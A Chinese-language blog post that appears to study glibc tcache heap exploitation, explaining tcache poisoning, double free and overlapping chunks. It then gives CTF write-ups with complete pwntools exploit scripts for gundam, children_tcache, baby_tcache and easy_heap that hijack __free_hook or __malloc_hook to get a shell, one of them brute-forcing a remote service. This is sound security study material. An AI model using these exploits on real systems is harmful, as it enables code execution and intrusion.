---
title: tcache-study
date: 2018-11-02 12:15:33
tags:
---

# tcache介绍

每个线程有64个bins，以16(8)递增，mensize从24(12)到1032(516).

每个bin是单链表结构，单个tcache bins默认最多包含7个块。

**chunk进入tcache的情形**

1. 释放时，_int_free中在检查了size合法后，放入fastbin之前，它先尝试将其放入tcache
2. 在_int_malloc中，若fastbins中取出块则将对应bin中其余chunk填入tcache对应项直到填满（smallbins中也是如此）：
3. 当进入unsorted bin(同时发生堆块合并）中找到精确的大小时，并不是直接返回而是先加入tcache中，直到填满：

**从tcache获取chunk的情形**

1. 在__libc_malloc，_int_malloc之前，如果tcache中存在满足申请需求大小的块，就从对应的tcache中返回chunk
2. 在遍历完unsorted bin(同时发生堆块合并）之后，若是tcache中有对应大小chunk则取出并返回：

由上可知malloc会优先考虑tcache，在使用它之前只有size等很少的完整性校验(只有存入前有size >= MINSIZE && aligned_OK (size) && !misaligned_chunk (p) && (uintptr_t) p <= (uintptr_t) -size)，而它本身并没有什么完整性校验，于是利用它进行攻击会简单很多。

# 影响

参考：https://www.anquanke.com/post/id/104760#h2-3

1.The House of Spirit

在之前，这种利用手段主要用在fastbin，因为它的检查要少很多，包括要释放的chunk大小正确且属于fastbin，下一个chunk大小要适中，不能小于2*SIZE_SZ且不能大于已分配内存。small的检查更多。

但是若使用tcache，就只需要关心当前chunk的地址及大小，chunk大小也不仅仅是fastbin了。

2.double free

和fastbin一样，通过free同一个chunk造成loop bin，但是fastbin不能连续释放同一个chunk，而tcache没有这种限制让它适用更大的chunk。

3.Overlapping chunks

若能更改指定chunk的size，增加其值，那么在释放后进入tcache再分配更改后的对应大小就能控制其后的chunk了。

4.tcache poisoning

对于已经在tcache里面的chunk，更改它的fd值即可在malloc时分配任意地址！

5.Smallbin cache filling bck write

在unsorted bin的unlink中，它回到了最原始的unlink，未进行其他检查(如bck->fd != victim)，这样又可以进行DWORD SHOOT啦：

```
unsorted_chunks (av)->bk = bck;
bck->fd = unsorted_chunks (av);
```

# gundam

安全客writeup写的很详细了。

题目分析:

该题目一共可以创建9个gundam，结构如下:

![](/assets/tcache/TIM截图20181102125026.png)

destroy_gundam函数该函数清除单个gundam。如下：

```
__int64 destory_gundam_D32()
{
  unsigned int v1; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  if ( gundam_number_20208C )
  {
    printf("Which gundam do you want to Destory:");
    __isoc99_scanf("%d", &v1);
    if ( v1 > 8 || !gundam_array_2020A0[v1] )   // 这里检查了gundam_array[v1]是否为0
    {
      puts("Invalid choice");
      return 0LL;
    }
    *(_DWORD *)gundam_array_2020A0[v1] = 0;
    free(*(void **)(gundam_array_2020A0[v1] + 8LL));// 仅仅释放 name_address，并没有清0，同时，也没有释放gundam_info
  }
  else
  {
    puts("No gundam");
  }
  return 0LL;
}
```

`free(*(void **)(gundam_array_2020A0[v1] + 8LL));`，这里在释放name的时候，并没有清0，所以，存在double free的问题。

blow_up_gundam函数会一次性清除所有gundam，如下:

```
unsigned __int64 below_E22()
{
  unsigned int i; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  for ( i = 0; i <= 8; ++i )
  {
    if ( gundam_array_2020A0[i] && !*(_DWORD *)gundam_array_2020A0[i] )
    {
      free((void *)gundam_array_2020A0[i]);
      gundam_array_2020A0[i] = 0LL;
      --gundam_number_20208C;
    }
  }
  puts("Done!");
  return __readfsqword(0x28u) ^ v2;
}
```

思路: 

1. 申请9个gundam，然后全部释放，在申请一个gundam得到heap的地址
2. 连续释放同一个gundam的name，构造tcache_dup
3. tcache_poisoning, 申请一个新的gundam，将下一个tcache的fd指向堆中的unsorted bin
4. 连续申请两个gundam，泄露libc地址
5. tcache_poisoning , 修改 free_hook为system的地址

```
#-*- coding:utf8
from pwn import *

debug = int(raw_input("debug:"))

if debug:
    p = process("./gundam")
    context.log_level = "debug"
    libc = ELF("/lib/x86_64-linux-gnu/libc-2.26.so")
else:
    p = process("./gundam")
    libc = ELF("./libc.so.6")

def build_gundam(name, gundam_type):
    p.recvuntil("choice :")
    p.sendline("1")
    p.recvuntil("name of gundam :")
    p.sendline(name)
    p.recvuntil("type of the gundam :")
    p.sendline(str(gundam_type))

def visit_gundam():
    p.recvuntil("choice :")
    p.sendline("2")
    data = p.recvuntil("Your ")
    return data

def destory_gundam(index):
    p.recvuntil("choice :")
    p.sendline("3")
    p.recvuntil("Destory:")
    p.sendline(str(index))

def blow_up_factory():
    p.recvuntil("choice :")
    p.sendline("4")

# 由于tcache 每个bin链 最长为7,所以通过创建9个gundam，然后删除8个，这样就必然有一个进入unsorted_bin，一个进入fast bin中
# 如果只创建8个gundam，然后删除8个，这样的话，0x110大小的chunk将和top chunk合并，无法进入unsorted bin
# 同理，也可以创建9个gundam，然后删除9个gundam
for i in range(9):
    build_gundam(str(i), 0)

for i in range(9):
    destory_gundam(i)

blow_up_factory()
build_gundam("", 0)  # 0 get heap_addr
data = visit_gundam()
heap_addr = u64("\x00" + data[14:19] + "\x00\x00")
heap_addr = heap_addr - 0x800
print hex(heap_addr)

build_gundam("1", 0) # 1
destory_gundam(0)
destory_gundam(0)
build_gundam(p64(heap_addr + 0xb50), 0)  # 2
build_gundam("", 0) # 3
build_gundam("", 0) # 4 get libc_addr
data = visit_gundam()
print data
# get libc_addr
libc_addr = u64(data[0x76:0x7c] + "\x00\x00") - 0x3dac0a
print hex(libc_addr)
libc.address = libc_addr
system_addr = libc.symbols['system']
free_hook = libc.symbols['__free_hook']

# 2,3 一样，两次destory，又可以得到 tcache poisoning
# 4 由于地址处于unsorted bin中，再次释放会导致 double free的错误
destory_gundam(1)
destory_gundam(2)
destory_gundam(3)
# destory_gundam(4)
blow_up_factory()

build_gundam(p64(free_hook), 0)   # 0
build_gundam("/bin/sh\x00", 0)     # 1
build_gundam(p64(system_addr), 0)
destory_gundam(1)

p.interactive()
```

# hitcon 2018 children_tcache

题目分析:

本题可以创建10个chunk,

new_heap函数中存在off_by_one漏洞。

```
read_BC8((__int64)&s, size);                  // off_by_one
strcpy(dest, &s);
heap_array_202060[i] = dest;
heap_size_array_2020C0[i] = size;
```

read_BC8函数:

```
v3 = __read_chk(0LL, a1, a2, a2);
if ( v3 <= 0 )
{
    puts("read error");
    _exit(1);
}
result = *(unsigned __int8 *)(v3 - 1LL + a1);
if ( (_BYTE)result == 10 )
{
    result = v3 - 1LL + a1;
    *(_BYTE *)result = 0;
}
return result;
```

思路:

1. 首先通过off_by_one 构造overlapping，泄露libc地址
2. 通过overlapping，构造出两个大小相同，指向地址一样的tcache bin
3. 通过tcache poisoning，任意地址写

**通过overlapping,即便free的时候，指针没有清0，也可以构造double free**

exp:

```
#-*- coding:utf8
from pwn import *

# debug = int(raw_input('debug:'))
debug = 1
if debug:
    p = process("./children_tcache")
    libc = ELF("/lib/x86_64-linux-gnu/libc-2.26.so")
    context.log_level = "debug"

def new_heap(size, data):
    p.recvuntil("choice: ")
    p.sendline("1")
    p.recvuntil("Size:")
    p.sendline(str(size))
    p.recvuntil("Data:")
    p.send(data)

def show_heap(index):
    p.recvuntil("choice: ")
    p.sendline("2")
    p.recvuntil("Index:")
    p.sendline(str(index))
    data = p.recvline()
    return data

def delete_heap(index):
    p.recvuntil("choice: ")
    p.sendline("3")
    p.recvuntil("Index:")
    p.sendline(str(index))

new_heap(0x500, "a") # 0
new_heap(0x68, "b") # 1
new_heap(0x4f0, "b") # 2      这里需要超过1032(0x400)，否则释放的时候，将进入tcache
# used to prevent the former chunk being consolidated with the top chunk
new_heap(0x20, "b") # 3

delete_heap(1)
delete_heap(0)

# 通过off_by_one修改next_chunk的size时候，由于上一步delete_heap(1)，会将next_chunk的prev_size字段覆盖为0xDADADADADADADADA,所以需要连续8次创建，并释放，将next_chunk的prev_size字段清空。
for i in range(9):
    new_heap(0x68 - i, "a" * (0x68 - i) + "\n")

    delete_heap(0)

# overlapping
new_heap(0x68, "a" * 0x60 + p64(0x580) + "\n") # 0
delete_heap(2)
new_heap(0x500, "a\n")     # 1
data = show_heap(0)
libc_addr = u64(data[0:6] + "\x00\x00") - 0x3dac78
libc.address = libc_addr
print hex(libc_addr)

new_heap(0x68, "a\n")      # 2  2 == 0
delete_heap(0)
delete_heap(2)
print hex(libc.symbols['__malloc_hook'])
new_heap(0x68, p64(libc.symbols['__malloc_hook']) + "\n")
new_heap(0x68, "a\n")
new_heap(0x68, p64(libc_addr + 0xfdb8e) + "\n")

p.interactive()
```

# baby_tcache

相比于children_tcache，该程序没有提供visit的功能。

思路如下:

1. 构造7个chunk

```
allocate(0x4f0, "aa\n") # 0
allocate(0x30, "aa\n")  # 1
allocate(0x60, "aa\n")  # 2
allocate(0x20, "aa\n")  # 3
allocate(0x78, "aa\n")  # 4
allocate(0x4f0, "aa\n") # 5
allocate(0x70, "aa\n")  # 6
```

2. 删除0，通过off_by_one，覆盖5的size字段，构造overlapping

```
# overlapping
free(0)
free(4)
allocate(0x78, "a" * 0x70 + p64(0x660) + "\n") # 0
free(5)
```

3. leak libc，具体可参考:
   * https://wally0813.github.io/exploit%20tech/ctf%20write%20up/2018/10/23/file_struct_flag/
   * https://vigneshsrao.github.io/babytcache/

3. 通过tcache poisoning，任意地址写

```
allocate(0x70, "a") # 8 == 0
free(8)
free(0)
allocate(0x70, p64(free_hook))     # 0
allocate(0x70, "a")                # 8
allocate(0x70, p64(one_gadget))    # 9
free(0)
```

完整exp:

```
# -*- coding: utf-8 -*-
from pwn import *

#r = remote(host,port)
r = process("./baby_tcache")
#context.log_level = "debug"
def allocate(size,data):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil("e:")
    r.sendline(str(size))
    r.recvuntil("a:")
    r.send(data)

def free(idx):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil("x:")
    r.sendline(str(idx))

allocate(0x4f0, "aa\n") # 0
allocate(0x30, "aa\n")  # 1
allocate(0x60, "aa\n")  # 2
allocate(0x20, "aa\n")  # 3
allocate(0x78, "aa\n")  # 4
allocate(0x4f0, "aa\n") # 5
allocate(0x70, "aa\n")  # 6

# overlapping
free(0)
free(4)
allocate(0x78, "a" * 0x70 + p64(0x660) + "\n") # 0
free(5)

# leak libc
free(2)                   # 进入 tcache 0x30
allocate(0x530, "c")     # 2
allocate(0x90, "\x60\xe7") # 4
allocate(0x60, "da")       # 5
#attach(r)
# 7 将0x60替换成0x20,0x30,0x50,0x60都可以,但是0x40不行，不知道为什么？？？？
allocate(0x60, p64(0xfbad1800) + p64(0) * 3 + "\x00")
libc = u64(r.recvuntil("\xff\xff")[8:16]) - 0x3ed8b0
print hex(libc)  # after this step, the binary exits immediately
one_gadget = libc + 0x4f322
free_hook = libc + 0x3ed8e8

# tcache poisoning
allocate(0x70, "a") # 8 == 0
free(8)
free(0)
allocate(0x70, p64(free_hook))     # 0
allocate(0x70, "a")                # 8
allocate(0x70, p64(one_gadget))    # 9
free(0)
r.interactive()
```

爆破12bits:

```
#!/usr/bin/env python2
# -*- coding: utf-8 -*-
import os

from pwn import *

context(arch="amd64", os="linux")

# 12 bits of libc addresses!
def exploit():
    # allocate four chunks A, X, B, C
    A = fit(filler="A", length=0x608)
    new_heap(A)

    X = fit(filler="X", length=0x20)
    new_heap(X)

    B = fit(filler="B", length=0x1808)
    new_heap(B)

    C = fit(filler="C", length=0x4F0)
    new_heap(C)

    # allocate chunks T1 and T2 of size 0x20 (the why is explained later)
    T1 = fit(filler="T1", length=0x20)
    new_heap(T1)

    T2 = fit(filler="T2", length=0x20)
    new_heap(T2)

    # allocate chunk T3 of size 0x20...
    T3 = fit(filler="T3", length=0x20)
    new_heap(T3)
    # ...and free it, so that it is put in `tcache->entries[1]`
    delete_heap(6)
    # now `tcache->entries[1]` contains the address of T3, whose `next` pointer is set to NULL,
    # i.e. `tcache->entries[1] = T3 -> NULL`

    # free chunk X (of size 0x20), which is also put in `tcache->entries[1]`
    delete_heap(1)
    # now `tcache->entries[1] = X -> T3 -> NULL`

    # free chunk B...
    delete_heap(2)
    # ...and promptly reallocate it (as B1), to override the least significative byte of
    # the `mchunk_size` field of chunk C with \0 (off-by-one NULL byte overflow)
    C_prev_size = 0x610 + 0x30 + 0x1810
    B1 = fit({0x1800: C_prev_size}, filler="B1", length=0x1808)
    new_heap(B1)
    # chunk B1 lies exactly in between chunks X and C (as chunk B did before)

    # having altered the `mchunk_size` field of C, chunk B1 is seen as not-in-use (even though it is); thus,
    # the last 8 bytes of B1 (which we control) are interpreted as the `mchunk_prev_size` field of C

    # here, we have set the `mchunk_prev_size` of C so that, instead of pointing to the start of
    # chunk B (as it should), it points to the start of chunk A

    # we now free chunk C with corrupted `mchunk_prev_size`, coalescing the whole block of heap from
    # chunk A to the end of C with the top chunk
    # (before freeing C, we free A so to pass the check `corrupted size vs. mchunk_prev_size`)
    delete_heap(0)
    delete_heap(3)
    # being between chunks A and C, chunk X was also merged into the top chunk; but
    # the address of X is still in `tcache->entries[1]`

    # allocate chunk L (for padding)...
    L = fit(filler="L", length=0x600)
    new_heap(L)
    # ...and allocate M, which is assigned the same address that X had!
    M = fit(filler="M", length=0x1000)
    new_heap(M)

    # now, free M so that it goes in the unsorted bin and populates its `fd` and `bk` fields
    # with addresses from libc (i.e. the address of the unsorted bin)
    delete_heap(2)
    # since M and X have the same address, the `next` pointer of X (coincident with the `fd` field of M)
    # is also overwritten with the address of the unsorted bin
    # now `tcache->entries[1] = X (== M) -> UNSORTED_BIN_ADDR -> ???`

    # if we allocate two chunks of size 0x20, these will be pulled from `tcache->entries[1]`,
    # and the second chunk will start exactly at `UNSORTED_BIN_ADDR`

    # our end goal is to write into `__malloc_hook` the address of a one-gadget
    # to do so, we need to:
    # 1) make malloc returning the address of `__malloc_hook`-0x10, so to write 0x31 at `__malloc_hook`-0x10
    #    and create a fake chunk of size 0x20 starting at `__malloc_hook`
    # 2) make malloc returning the address of `__malloc_hook`, and save the pointer
    # 3) put at the top of the `tcache->entries[1]` bin the address of a one-gadget
    # 4) free the `__malloc_hook` chunk, which goes into `tcache->entries[1]` and `__malloc_hook` is
    #    updated with the address of the one-gadget (which was at the top of `tcache->entries[1]`)
    # 5) call `malloc()` to trigger the execution of `__malloc_hook()`

    # we now continue the exploit proceeding with step 1)

    # we reallocate M as M1, specifying a size of 0x1000 but providing only 3 bytes of data
    # (the 3 least significative bytes of the address of `__malloc_hook`-0x10)
    M1 = p32(__malloc_hook_addr - 0x10 & 0xFFFFFF)[:-1]
    new_heap(M1, size=0x1000)
    # since, once again, M1 overlaps with X, with this reallocation we changed the lowest 3 bytes of
    # the `next` pointer of X (which was `UNSORTED_BIN_ADDR` and is now the address of `__malloc_hook`-0x10)

    # as said a few lines above, we malloc a chunk of size 0x20 to first pull X from `tcache->entries[1]`...
    Z = fit(filler="Z", length=0x20)
    new_heap(Z)
    # ...and then a second chunk of size 0x20 to pull our chosen address of libc...
    W = "AAAABBBB" + p64(0x31)
    new_heap(W, size=0x20)
    # ...which we used to set the `mchunk_size` field of the (imaginary) chunk starting at `__malloc_hook`
    # to 0x31 (i.e. 0x20 (chunk data) + 0x10 (chunk headers) + 0x1 (PREV_INUSE bit))

    # since we artificially added an entry in `tcache->entries[1]` by modifying a `next` pointer
    # from NULL to `__malloc_hook`-0x10, the two consecutive allocations of chunks Z and W (both of size 0x20)
    # had the side effect of setting `tcache->counts[1]` to -1, invalidating the possibility
    # of using `tcache->entries[1]` anymore

    # so, before moving on, we restore `tcache->counts[1]` to a positive number by freeing chunks T1 and T2
    # (i.e. putting them into `tcache->entries[1]`), allocated at the start of the exploit for this exact reason
    delete_heap(4)
    delete_heap(5)

    # ######################################################################## #

    # now, we repeat the exact same process as above to make malloc returning exactly
    # the address of `__malloc_hook`, completing step 2)

    A = fit(filler="A", length=0xD20)
    new_heap(A)

    X = fit(filler="X", length=0x20)
    new_heap(X)

    B = fit(filler="B", length=0x1808)
    new_heap(B)

    C = fit(filler="C", length=0x4F0)
    new_heap(C)

    # free chunk X which goes in `tcache->entries[1]`
    delete_heap(5)

    # free chunk B...
    delete_heap(7)
    # ...and promptly reallocate it (as B1), to override the least significative byte of
    # the `mchunk_size` field of chunk C with \0 (off-by-one NULL byte overflow)
    C_prev_size = 0xD30 + 0x30 + 0x30 + 0x30 + 0x1810
    B1 = fit({0x1800: C_prev_size}, filler="B1", length=0x1808)
    new_heap(B1)
    # chunk B1 lies exactly in between chunks X and C (as chunk B did before)

    # as explained before, free chunk A and in turn C...
    delete_heap(4)
    delete_heap(8)
    # ...so to merge back X into the top chunk; but X is also in `tcache->entries[1]`

    # allocate chunk L (for padding)...
    L = fit(filler="L", length=0xD30 - 0x10 + 0x30)
    new_heap(L)
    # ...and allocate M, which is assigned the same address that X had!
    M = fit(filler="M", length=0x1000)
    new_heap(M)

    # allocate any chunk after M, so that when we free M it doesn't coalesce with the top chunk
    Z = fit(filler="Z", length=0x1000)
    new_heap(Z)

    # now, free M so that it goes in the unsorted bin and populates its `fd` and `bk` fields
    # with the address of the unsorted bin
    delete_heap(7)

    # reallocate M as M1, specifying a size of 0x1000 but providing only 3 bytes of data
    # (the 3 least significative bytes of the address of `__malloc_hook`)
    M1 = p32(__malloc_hook_addr & 0xFFFFFF)[:-1]
    new_heap(M1, size=0x1000)
    # since M1 overlaps with X, with this reallocation we changed the lowest 3 bytes of
    # the `next` pointer of X (which was `UNSORTED_BIN_ADDR` and is now the address of `__malloc_hook`)

    # as explained before, we malloc a chunk of size 0x20 to first pull X from `tcache->entries[1]`...
    Z = fit(filler="Z", length=0x20)
    new_heap(Z)

    # (free chunks we don't use anymore, since the binary allows to use
    # at maximum 10 "heaps" (as it calls them) at a time)
    delete_heap(0)

    # ...and then a second chunk of size 0x20 to pull our chosen address of libc...
    W = "\0"
    new_heap(W, size=0x20)
    # ...in which we write \0 (so not to trigger any involuntary calls to `__malloc_hook`)

    # we now have a pointer to `__malloc_hook`

    # (free chunks we don't use anymore, since the binary allows to use
    # at maximum 10 "heaps" (as it calls them) at a time)
    delete_heap(2)
    delete_heap(4)
    delete_heap(7)
    delete_heap(8)

    # ######################################################################## #

    # now, we repeat the exact same process as above to put the address of a one-gadget
    # at the top of the `tcache->entries[1]` bin, completing step 3)

    A = fit(filler="A", length=0xD20)
    new_heap(A)

    X = fit(filler="X", length=0x20)
    new_heap(X)

    B = fit(filler="B", length=0x1808)
    new_heap(B)

    C = fit(filler="C", length=0x4F0)
    new_heap(C)

    # free chunk X which goes in `tcache->entries[1]`
    delete_heap(4)

    # free chunk B...
    delete_heap(7)
    # ...and promptly reallocate it (as B1), to override the least significative byte of
    # the `mchunk_size` field of chunk C with \0 (off-by-one NULL byte overflow)
    C_prev_size = 0xD30 + 0x30 + 0x1810
    B1 = fit({0x1800: C_prev_size}, filler="B1", length=0x1808)
    new_heap(B1)
    # chunk B1 lies exactly in between chunks X and C (as chunk B did before)

    # as explained before, free chunk A and in turn C...
    delete_heap(2)
    delete_heap(8)
    # ...so to merge back X into the top chunk; but X is also in `tcache->entries[1]`

    # allocate chunk L (for padding)...
    L = fit(filler="L", length=0xD30 - 0x10)
    new_heap(L)
    # ...and allocate M, which is assigned the same address that X had!
    M = fit(filler="M", length=0x1000)
    new_heap(M)

    # allocate any chunk after M, so that when we free M it doesn't coalesce with the top chunk
    Z = fit(filler="Z", length=0x1000)
    new_heap(Z)

    # now, free M so that it goes in the unsorted bin and populates its `fd` and `bk` fields
    # with the address of the unsorted bin
    delete_heap(7)

    # reallocate M as M1, specifying a size of 0x1000 but providing only 3 bytes of data
    # (the 3 least significative bytes of the address of the one gadget)
    M1 = p32(one_gadget_addr & 0xFFFFFF)[:-1]
    new_heap(M1, size=0x1000)
    # since M1 overlaps with X, with this reallocation we changed the lowest 3 bytes of
    # the `next` pointer of X (which was `UNSORTED_BIN_ADDR` and now is the address of the one-gadget)

    # (free chunks we don't use anymore, since the binary allows to use
    # at maximum 10 "heaps" (as it calls them) at a time)
    delete_heap(8)

    # as explained before, we malloc a chunk of size 0x20 to pull X from `tcache->entries[1]`...
    Z = fit(filler="Z", length=0x20)
    new_heap(Z)
    # ...and now `tcache->entries[1] = ONE_GADGET_ADDR -> ???`

    # ######################################################################## #

    # we free the `__mallok_hook` chunk, completing step 4)
    delete_heap(0)
    # now the address of the one-gadget is written at the address of `__malloc_hook`

    # in step 5), we malloc any chunk to trigger `__malloc_hook()`...
    io.sendlineafter("Your choice: ", "1")
    io.sendlineafter("Size:", "123")

    # ...and the shell pops!


def new_heap(data, size=None):
    out = io.recvuntil("Your choice: ")
    if "Invalid" in out:
        # remote didn't receive data correctly, quit early
        raise EOFError
    io.sendline("1")

    out = io.recvuntil("Size:")
    if "Invalid" in out:
        # remote didn't receive data correctly, quit early
        raise EOFError
    if not size:
        io.sendline(str(len(data)))
    else:
        io.sendline(str(size))

    out = io.recvuntil("Data:")
    if "Invalid" in out:
        # remote didn't receive data correctly, quit early
        raise EOFError
    io.send(data)


def delete_heap(index):
    out = io.recvuntil("Your choice: ")
    if "Invalid" in out:
        # remote didn't receive data correctly, quit early
        raise EOFError
    io.sendline("2")

    out = io.recvuntil("Index:")
    if "Invalid" in out:
        # remote didn't receive data correctly, quit early
        raise EOFError
    io.sendline(str(index))


binary = ELF("./baby_tcache")  # https://github.com/integeruser/bowkin
libc = ELF("./libc.so")

# as said above, we need some bruteforcing
with context.quiet:
    i = 0
    while True:
        i += 1
        print(i)

        try:
            if not args["REMOTE"]:
                argv = [binary.path]
                envp = {"PWD": os.getcwd()}

                if args["GDB"]:
                    io = gdb.debug(
                        args=argv,
                        env=envp,
                        aslr=False,
                        terminal=["tmux", "new-window"],
                        gdbscript="""
                            set breakpoint pending on
                            set follow-fork-mode parent
                            baseaddr
                            set $chunks = $baseaddr+0x202060
                            continue
                        """,
                    )
                else:
                    io = process(argv=argv, env=envp)
            else:
                io = remote("52.68.236.186", 56746)

            if args["GDB"]:
                libc_address = 0x7FFFF79E4000
            else:
                libc_address = (
                    0x7F6A5C9E2000
                )  # one of the many possible base addresses of libc, taken from GDB
                # we need to re-execute this exploit until the remote program
                # uses this address as base address of libc

            __malloc_hook_addr = libc_address + 0x3EBC30

            # $ one_gadget libc.so.6
            # . . .
            # 0x10a38c        execve("/bin/sh", rsp+0x70, environ)
            # constraints:
            #   [rsp+0x70] == NULL
            one_gadget_addr = libc_address + 0x10A38C

            exploit()

            if args["GDB"]:
                io.interactive()
                break  # stop bruteforce
            else:
                out = io.recv(200, timeout=2)
                if "Data:" in out:
                    # something went wrong
                    raise EOFError
                # otherwise, we should have a shell
                sleep(0.5)
                io.sendline("ls")
                sleep(0.5)
                io.sendline("ls /home/")
                sleep(0.5)
                io.sendline("ls /home/baby_tcache/")
                sleep(0.5)
                io.sendline("cat /home/baby_tcache/fl4g.txt")
                sleep(0.5)
                io.interactive()
                break  # stop bruteforce
        except EOFError:
            io.close()
```

# lctf2018 easy_heap

```
#-*- coding:utf8
from pwn import *
def add(size,data):
    p.recvuntil('>')
    p.sendline('1')
    p.recvuntil('size')
    p.sendline(str(size))
    p.recvuntil('content')
    p.send(data)

def dele(index):
    p.recvuntil('>')
    p.sendline('2')
    p.recvuntil('index')
    p.sendline(str(index))

context.log_level = "debug"
p=process('./easy_heap') #,env={'LD_PRELOAD':'./libc64.so'})
#p=remote('118.25.150.134', 6666) 
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
for i in range(10):
    add(0xf0,'aaa\n')

dele(1)
for i in range(3,8):
    dele(i)
dele(9)
dele(8)
dele(2)
dele(0)

for i in range(7):
    add(0xf0,'aaa\n')
# 这时候，unsorted bin中还有3个块，申请一个出来时，剩下的都会被添加到tcache中
add(0,'')

"""
0x5595c02f3500 PREV_INUSE {
  mchunk_prev_size = 0, 
  mchunk_size = 257, 
  fd = 0x5595c02f3b00, 
  bk = 0x5595c02f3300, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
            
"""
# 这里需要注意，不能添加任何值，否则会破坏里边的指针
add(0xf8, '\n')
dele(0)
dele(1)
dele(2)
dele(3)
dele(4)
dele(6)

"""
0x5595c02f3600 {
  mchunk_prev_size = 256, 
  mchunk_size = 256, 
  fd = 0x559500616161, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
"""
dele(5)
p.recvuntil('>')
p.sendline('3')
p.recvuntil("index \n> ")
p.sendline('8')

addr = u64(p.recv(6).ljust(8,'\x00'))
print "addr", hex(addr)
libc_base = addr - (0x7f3c863a4c78 - 0x7f3c85fca000)
print "libc_base", hex(libc_base)
free_hook = libc_base+libc.symbols['__free_hook']

for i in range(7):
    add(16,'/bin/bash\n')
one = libc_base + 0xfccde
print "free_hook", hex(free_hook)
add(0,'')
dele(5)
dele(8)
dele(9)
add(16,p64(free_hook)+'\n')
add(16,'abc\n')
add(16,p64(one)+'\n')
dele(0)

p.interactive()
```





